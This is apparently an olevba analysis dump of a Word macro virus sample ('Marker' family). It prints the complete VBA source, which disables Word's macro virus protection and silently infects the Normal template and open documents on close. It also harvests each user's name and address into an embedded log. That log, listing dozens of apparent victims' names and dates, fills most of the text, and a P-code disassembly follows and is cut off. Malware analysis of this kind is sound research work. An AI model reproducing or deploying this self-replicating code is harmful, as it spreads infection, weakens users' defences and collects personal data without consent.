olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.em
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.em - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


' DSR & FHS , KZ, Kostanai
' KGU-EMF by DSR & FHS v0.1
Private Sub Document_Close()

On Error Resume Next

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find("' DSR & FHS , KZ, Kostanai", 1, 1, 10, 10)
NormalTemplateInfected = nt.CodeModule.Find("' DSR & FHS , KZ, Kostanai", 1, 1, 10, 10)

'Switch the VirusProtection OFF, ConfirmConversion OFF, SaveNormalPrompt OFF
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False


  If (Day(Now()) <> 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    LogFile = "C:\bootlog" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netlog.sys" For Output As #1
    Print #1, "For YOU"
    Print #1, "SCOOTER"
    Print #1, "Wellcome to Calipso"
    Print #1, "FasterHarderScooter"
    Print #1, "Scooter on the Web: www.scooterweb.de"
    Print #1, "Wiritten by FHS & DSR (KZ, Kostanai town, KGU)"
    Print #1, "This is a simple example"
    Print #1, "read " & LogFile
    Close #1
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If ((DocumentInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate)) Or _
   ((NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate)) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & "* DSR & FHS , KGU EMF" & Chr(13) & _
              "' " & "00:15:54  -  Wednesday, 22.12.1999" & Chr(13) & _
              "' " & "KZ, Kostanai, KGU EMF Applied Mathematics" & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     DocumentInfected = False Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:20:14 - среда, 3 май 2000
' Пожелал  остаться неизвестным
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:36:42 - воскресенье, 14 май 2000
' Khudyakov Yuriy
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:27:56 - понедельник, 15 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:55:46 - вторник, 16 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:25:20 - среда, 17 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:48:08 - среда, 17 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:53:13 - среда, 17 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:46:39 - среда, 17 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:10:05 - четверг, 18 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:25:39 - понедельник, 29 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:10:40 - вторник, 30 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:26:48 - среда, 31 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:05:35 - среда, 31 май 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:00:58 - четверг, 1 июн 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:12:39 - четверг, 1 июн 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:53:15 - пятница, 2 июн 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:30:05 - воскресенье, 4 июн 2000
' Худякова
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:05:21 - понедельник, 5 июн 2000
' Khudyakov Yuriy
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:29:43 - четверг, 8 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:14:45 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:35:08 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:35:46 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:36:21 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:37:01 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:37:29 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:38:06 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:38:38 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:39:26 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:40:12 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:40:46 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:41:29 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:42:03 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:43:04 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:43:50 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:46:52 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:02:12 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:39:23 - пятница, 9 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:50:11 - суббота, 10 июн 2000
' Андрей
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:43:32 - суббота, 24 июн 2000
' Klient
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:24:05 - суббота, 15 июл 2000
' Klient
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:55:48 - вторник, 1 авг 2000
' Ермаков В.А.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:56:52 - вторник, 1 авг 2000
' Ермаков В.А.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:10:00 - четверг, 3 авг 2000
' Ермаков В.А.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:22:04 - четверг, 3 авг 2000
' User
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:55:33 - четверг, 10 авг 2000
' User
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:57:07 - четверг, 10 авг 2000
' User
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:19:38 - пятница, 11 авг 2000
' Ермаков В.А.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:23:41 - пятница, 11 авг 2000
' Ермаков В.А.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:42:42 - пятница, 11 авг 2000
' Ермаков В.А.
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:18:14 - вторник, 26 сен 2000
' User
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:57:13 - четверг, 28 сен 2000
' User
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:41:44 - четверг, 28 сен 2000
' Compaq Distributor
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:24:45 - Monday, 23 Oct 2000
' Fatima
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:41:01 - четверг, 26 окт 2000
' Oleg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 19:43:56 - четверг, 26 окт 2000
' Oleg
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:58:56 - суббота, 28 окт 2000
' *
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:00:04 - пятница, 10 ноя 2000
' Olga
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:44:49 - пятница, 10 ноя 2000
' Olga
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:43:30 - четверг, 14 дек 2000
' Olga
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 03:17:45 - понедельник, 7 Фев 2000
' GEZ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 03:30:27 - среда, 16 Фев 2000
' GEZ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 04:50:10 - среда, 16 Фев 2000
' GEZ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:41:03 - среда, 15 Мар 2000
' GEZ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:48:43 - четверг, 3 май 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:11:43 - вторник, 22 май 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 17:30:43 - четверг, 31 май 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:23:13 - суббота, 7 июл 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:45:17 - среда, 11 июл 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 14:57:06 - четверг, 12 июл 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:21:16 - вторник, 14 авг 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:28:21 - среда, 15 авг 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:31:56 - среда, 15 авг 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:36:33 - вторник, 21 авг 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:29:07 - четверг, 23 авг 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:34:12 - понедельник, 19 ноя 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:41:25 - понедельник, 19 ноя 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:42:17 - понедельник, 19 ноя 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:23:53 - понедельник, 19 ноя 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:26:27 - понедельник, 19 ноя 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:29:18 - понедельник, 19 ноя 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:42:38 - понедельник, 19 ноя 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:45:45 - понедельник, 19 ноя 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 16:34:43 - вторник, 27 ноя 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:46:37 - четверг, 29 ноя 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:48:19 - четверг, 29 ноя 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:50:30 - четверг, 29 ноя 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:53:31 - четверг, 29 ноя 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:56:48 - четверг, 29 ноя 2001
' Polaz
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:13:12 - ceturtdiena, 6 Dec 2001
' Ship Management
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 11:32:21 - pirmdiena, 17 Dec 2001
' Ship Management
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:52:49 - otrdiena, 18 Dec 2001
' Ship Management
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 10:58:44 - otrdiena, 18 Dec 2001
' Ship Management
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:41:16 - otrdiena, 18 Dec 2001
' Ship Management
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:47:38 - otrdiena, 18 Dec 2001
' Ship Management
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 13:00:39 - otrdiena, 18 Dec 2001
' Ship Management
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 23:57:18 - пятница, 11 апр 2003
' rer
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 09:07:31 - суббота, 12 апр 2003
' rer
'



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.em
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 39788 bytes
' Line #0:
' Line #1:
' Line #2:
' 	QuoteRem 0x0000 0x0019 " DSR & FHS , KZ, Kostanai"
' Line #3:
' 	QuoteRem 0x0000 0x001A " KGU-EMF by DSR & FHS v0.1"
' Line #4:
' 	FuncDefn (Private Sub Document_Close())
' Line #5:
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' Line #8:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #9:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #10:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #11:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #12:
' Line #13:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #16:
' Line #17:
' 	LitStr 0x001A "' DSR & FHS , KZ, Kostanai"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #18:
' 	LitStr 0x001A "' DSR & FHS , KZ, Kostanai"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #19:
' Line #20:
' 	QuoteRem 0x0000 0x004B "Switch the VirusProtection OFF, ConfirmConversion OFF, SaveNormalPrompt OFF"
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #23:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #24:
' Line #25:
' Line #26:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Ne 
' 	Paren 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #27:
' Line #28:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #29:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #30:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #32:
' 	EndIfBlock 
' Line #33:
' Line #34:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #35:
' Line #36:
' 	Ld LogFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St LogFile 
' Line #37:
' 	LitStr 0x000A "C:\bootlog"
' 	Ld LogFile 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St LogFile 
' Line #38:
' Line #39:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld LogData 
' 	PrintItemNL 
' Line #41:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #42:
' Line #43:
' 	LitStr 0x000D "c:\netlog.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "For YOU"
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "SCOOTER"
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Wellcome to Calipso"
' 	PrintItemNL 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "FasterHarderScooter"
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "Scooter on the Web: www.scooterweb.de"
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "Wiritten by FHS & DSR (KZ, Kostanai town, KGU)"
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "This is a simple example"
